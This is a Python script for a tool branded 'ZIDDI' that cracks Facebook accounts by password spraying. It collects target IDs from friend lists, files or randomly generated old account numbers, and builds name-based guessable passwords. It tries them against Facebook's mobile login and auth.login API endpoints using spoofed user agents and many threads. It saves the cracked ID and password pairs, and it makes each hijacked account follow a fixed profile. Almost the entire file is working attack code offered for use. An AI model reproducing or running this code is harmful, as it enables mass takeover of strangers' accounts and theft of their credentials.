W = '\033[97;1m'

R = '\033[91;1m'

G = '\033[92;1m'

Y = '\033[93;1m'

B = '\033[94;1m'

P = '\033[95;1m'

C = '\033[96;1m'

N = '\x1b[0m'

import os

try:

	import requests

except ImportError:

	os.system("pip install requests")



try:

	import concurrent.futures

except ImportError:

	os.system("pip install futures")



import os

import sys

import time

import requests

import random

import platform

import base64

import subprocess

from concurrent.futures import ThreadPoolExecutor

import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess

try:

	import rich

except ImportError:

	os.system('pip install rich')

	time.sleep(1)

	try:

		import rich

	except ImportError:

		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

import base64

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from urllib.parse import quote

# UA LIST

#ugen2=open('frec.txt','r').read().splitlines()

#ugen=open('m.txt','r').read().splitlines()

ugen2=['Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h']

ugen=['Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1']

# INDICATION

id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]

cp = 0

ok = []

try:

	os.mkdir('/sdcard/')

except:pass

# COLORS

x = '\33[m' 

k = '\033[93m' 

h = '\x1b[1;92m' 

hh = '\033[32m' 

u = '\033[95m' 

K = '\033[95m' 

kk = '\033[33m' 

b = '\33[1;96m' 

p = '\x1b[0;34m' 

# Converter 

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR

def clear():

	os.system('clear')

# BACK

def back():

	login()



ZIDDI="ZIDDI-"

imt="-Busra4786=="

ZIDDI="Lover-"

myid=uuid.uuid4().hex[:10].upper()

try:

	key1 = open('/data/data/com.termux/files/usr/bin/.mrZIDDI-cov', 'r').read()

except:

	kok=open('/data/data/com.termux/files/usr/bin/.mrZIDDI-cov', 'w')

	kok.write(myid+imt)

	kok.close()

def login():

	try:

		token = open('.token.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])

			public_menu()

		except KeyError:

			Public()

		except requests.exceptions.ConnectionError:

			clear()

			print(logo)

			print ( ' [×] Connection Timeout')

			exit()

	except IOError:

		Public()

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)

############### #LOGO############## ## 



# LOGIN

def Public():

	clear()

	print(logo)

	print  (' [01] Login With Token\n [02] Login With Cookie')

	pil=input('\n [#] Select One : ')

	if pil in ['1','01']:

		panda = input(' [+] Token : ')

		akun=open('.token.txt','w').write(panda)

		try:

			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)

			tes3 = json.loads(tes.text)['id']

			print (" [] Login Successful")

			login()

		except KeyError:

			print( ' [×] Login Failed ')

			time.sleep(2.5)

			Public()

		except requests.exceptions.ConnectionError:

			print ( ' [×] Connection Timeout')

			exit()

	elif pil in ['2','02']:

		try:

			cookie=input(" [+] Cookie : ")

			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 

			find_token = re.search("(EAAG\w+)", data.text)

			ken=open(".token.txt", "w").write(find_token.group(1))

			print (" [] Login Successful")

			login()

		except Exception as e: 

			os.system("rm -f .token.txt")

			print( ' [×] Login Failed ')

			time.sleep(2.5)

			login()

			exit()

def public_menu():

	try:

		token = open('.token.txt','r').read()

	except IOError:

		exit()

	clear()

	print(logo)

	pil = input('\n [+] Enter ID Target : ')

	try:

		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()

		for pi in koh2['friends']['data']:

			id.append(pi['id']+'|'+pi['name'])

		print(' [] Total : '+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print (' [#] Connection Time Out')

		exit()

	except (KeyError,IOError):

		print(' [!] Not public Or Token Expire')

		exit()

def File():

			clear()

			print(logo)

			try:

				fileX = input ('\n [+] Enter file path : ') 

				for line in open(fileX, 'r').readlines():

					id.append(line.strip())

				setting()

			except IOError:

				exit("\n [!] file %s not found"%(fileX))



def setting():

	hu = ("2")

	if hu in ['1','01']:

		for tua in sorted(id):

			id2.append(tua)



	elif hu in ['2','02']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['3','03']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		print (' [!] Choose Correct Option')

		exit()

	clear()

	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')

	hc = input ("\n [#] method : ")

	if hc in ['1','01']:

		method.append('mobile')

	elif hc in ['2','02']:

		method.append('free')

	else:

		method.append('mobile')

	passmenu()

def passmenu():

	clear()

	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')

	passmen=input('\n [#] Select Pass : ')

	if passmen in ['1','01']:

		first()

	elif passmen in ['2','02']:

		name()

	elif passmen in ['3','03']:

		name2()

	else:

		passmenu()

		

def first():

	clear()

	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = ['445566']

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')
					
					pwv.append(frs+'gaming')
					
					pwv.append(frs+'@')
					
					pwv.append(frs+'@@')
					
					pwv.append(frs+'@@@')

					pwv.append(frs+'786')
					
					pwv.append(frs+'@123')
					
					pwv.append(frs+'@123@')
					
					pwv.append(frs+'@1234@')
					
					pwv.append(frs+'@@##')

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')
					
					pwv.append(frs+'gaming')
					
					pwv.append(frs+'@')
					
					pwv.append(frs+'@@')
					
					pwv.append(frs+'@@@')

					pwv.append(frs+'786')
					
					pwv.append(frs+'@123')
					
					pwv.append(frs+'@123@')
					
					pwv.append(frs+'@1234@')
					
					pwv.append(frs+'@@##')

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(free,idf,pwv)

			else:

				pool.submit(crack,idf,pwv)

def name():

	clear()

	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			try:

				idf,nmf = yuzong.split('|')

				xz = nmf.split(' ')

				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]

				else:

					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]

				if 'mobile' in method:

					pool.submit(crack,idf,pwv)

				elif 'free' in method:

					pool.submit(free,idf,pwv)

				else:

					pool.submit(crack,idf,pwv)

			except:

				pass

def name2():

	clear()

	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = ['445566']

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')
					
					pwv.append(frs+'gaming')
					
					pwv.append(frs+'@')
					
					pwv.append(frs+'@@')
					
					pwv.append(frs+'@@@')

					pwv.append(frs+'786')
					
					pwv.append(frs+'@123')
					
					pwv.append(frs+'@123@')
					
					pwv.append(frs+'@1234@')
					
					pwv.append(frs+'@@##')
					

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')
					
					pwv.append(frs+'gaming')
					
					pwv.append(frs+'@')
					
					pwv.append(frs+'@@')
					
					pwv.append(frs+'@@@')

					pwv.append(frs+'786')
					
					pwv.append(frs+'@123')
					
					pwv.append(frs+'@123@')
					
					pwv.append(frs+'@1234@')
					
					pwv.append(frs+'@@##')

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(free,idf,pwv)

			else:

				pool.submit(crack,idf,pwv)

	

# CRACKER

def crack(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	sys.stdout.write('\r %s[ ZIDDI ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			pw = pw.lower()

			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}

			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				cp +=1

				print( f'\r\x1b[1;91m [ ZIDDI-CP ] {idf} | {pw}')

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				coki=po.cookies.get_dict()

				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'\r\x1b[1;92m [ ZIDDI -OK ] {idf} | {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/ids/ziddi–ok.txt','a').write('%s\n' % wrt)

				follow(ses,coki)

				break



			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

def free(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	sys.stdout.write('\r %s[ ZIDDI ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			pw = pw.lower()

			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}

			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				rint( f'\r\x1b[1;91m [ ZIDDI -CP ] {idf} | {pw}')

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				coki=po.cookies.get_dict()

				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'\r\x1b[1;92m [ ZIDDI-OK ] {idf} | {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/ZIDDI-OK.txt','a').write('%s\n' % wrt)

				follow(ses,coki)

				break



			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

def follow(ses,coki):

	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})

	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')

	get = r.find('a', string='Follow').get('href')

	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text



logo = ("""\033[36m \033[1m
$$$$$$$$\ $$$$$$\ $$$$$$$\  $$$$$$$\  $$$$$$\ 
\____$$  |\_$$  _|$$  __$$\ $$  __$$\ \_$$  _|
    $$  /   $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
   $$  /    $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
  $$  /     $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
 $$  /      $$ |  $$ |  $$ |$$ |  $$ |  $$ |  
$$$$$$$$\ $$$$$$\ $$$$$$$  |$$$$$$$  |$$$$$$\ 
\________|\______|\_______/ \_______/ \______|
\033[36m \033[1m
__________________×______________________
  Owner   :  ZIDDI SEHZADA\033[24m
  Github   : FUCK
  Facebook : MD BABU MIA
  Contact : +880161636**★★
__________________×______________________\033[32m""")



class Main:

	def __init__(self):

		self.id = []

		self.ok = []

		self.cp = []

		self.loop = 0

		os.system("clear")

		print(logo)

		print("\n [1] File Cloning \033[37m {VIP}")

		print("\033[32m [2] Public Cloning \033[31;1m{Not Warking}")

		print("\033[32m [3] Create File \033[31;1m{Not Warking}")

		print(" \033[32m[4] 2009-10 Cloning \033[37m {VIP🔥}")

		print("\033[32m [5] 2011-14 Cloning")

		print(" [E] Exit Programming\n")

		ZIDDI =input(" Choose : ")

		if ZIDDI in ["1", "01"]:

			File()

		if ZIDDI in ["2", "02"]:

			Public()

		if ZIDDI in ["3", "03"]:

			os.system("python Dump.py")

		if ZIDDI in ["4", "04"]:

			self.old()

		if ZIDDI in ["5", "05"]:

			self.old2()

			exit()

		else:

			print (" Select Correctly ")

			time.sleep(1)

			Main()



	def old(self):

		x = 111111111

		xx = 999999999

		idx = "100000" 

		os.system('clear');print(logo)

		limit = int(input(" \033[37m[+] \033[35mTOTAL IDS TO CRACK LIMIT \033[33;1m100,000: "))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n\033[1;32m [!] USE (123456,1234567,12345678,) FOR IDZ\033[1;37m ")

				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))

				os.system("clear")

				print(logo)

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))

				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n [>>] CRACK COMPLETE...")

		except Exception as e:exit(str(e))



	def api(self, uid, pwx):

		rua = random.choice([

			"Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1",
			
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h",

"Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/",

"Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;] FBBK/1",

"Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM",

"Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]",

"Dalvik/1.6.0 (Linux; U; Android 13; SM-G3518 Build/JLS36C) [FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/199281912;FBCR/Maxcom;FBMF/samsung;FBBD/samsung;;FBDV/SM-G3518;FBDM/{density=1.0,width=720,=height=1200};FBSV/13.0.1;FBCA/armeabi-v7a:armeabi;]",

"Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;] ",

"Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",

"Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1",

"Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1",

"Mozilla/5.0 (Linux; Android 9; S32 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/285.0.0.17.119;]"

		])

		sys.stdout.write(

			"\r [ ZIDDI ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))

		); sys.stdout.flush()

		for pw in pwx:

			pw = pw.lower()

			ses = requests.Session()

			headers = {

				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

				"x-fb-sim-hni": str(random.randint(20000, 40000)), 

				"x-fb-net-hni": str(random.randint(20000, 40000)), 

				"x-fb-connection-quality": "EXCELLENT",

				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",

				"user-agent": rua, 

				"content-type": "application/x-www-form-urlencoded", 

				"x-fb-http-engine": "Liger"

			}

			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 

			if "session_key" in response.text and "EAAA" in response.text:

				print("\r \033[0;92m[ ZIDDI -OK ] %s | %s\033[0;97m         "%(uid, pw))

				print ("\r \033[0;92m Congrats Bro ")

				self.ok.append("%s|%s"%(uid, pw))

				open("2009-ZIDDI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[0;92m[ ZIDDI-OK ] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

